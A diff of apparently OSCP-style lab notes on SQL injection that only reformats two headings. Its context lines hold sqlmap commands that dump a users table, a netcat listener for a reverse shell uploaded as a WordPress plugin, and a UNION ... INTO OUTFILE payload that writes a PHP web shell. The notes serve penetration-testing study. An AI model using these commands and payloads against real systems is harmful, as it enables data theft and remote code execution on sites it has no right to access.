@@ -896,7 +896,7 @@
     `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec --tables --batch --threads=5`  
     Dump data for the table  
     `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec -T users --dump --batch --threads=5`  
-  - Capstone Lab: Wordpress vulnerable plugin - Unauthenticated SQL Injection - reverse shell upload
+  - **Capstone Lab**: Wordpress vulnerable plugin - Unauthenticated SQL Injection - reverse shell upload
     1. add etc/hosts: alvida-eatery.org
     2. web vulnerability scan
        - `nikto -h http://alvida-eatery.org`
@@ -925,7 +925,7 @@
     11. `nc -nvlp 8888`
     12. Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin and upload plug.zip > install > activate plugin
     13. netcat got response and find the flag `find / -name "flag.txt" 2>/dev/null`  
-  - Capstone Lab: UNION based write shells to server - INTO OUTFILE
+  - **Capstone Lab**: UNION based write shells to server - INTO OUTFILE
     Capture POST request of "subscribe" function in website
     `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`
     `mail-list=hello@gmail.com' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE '/var/www/html/shell.php' #`
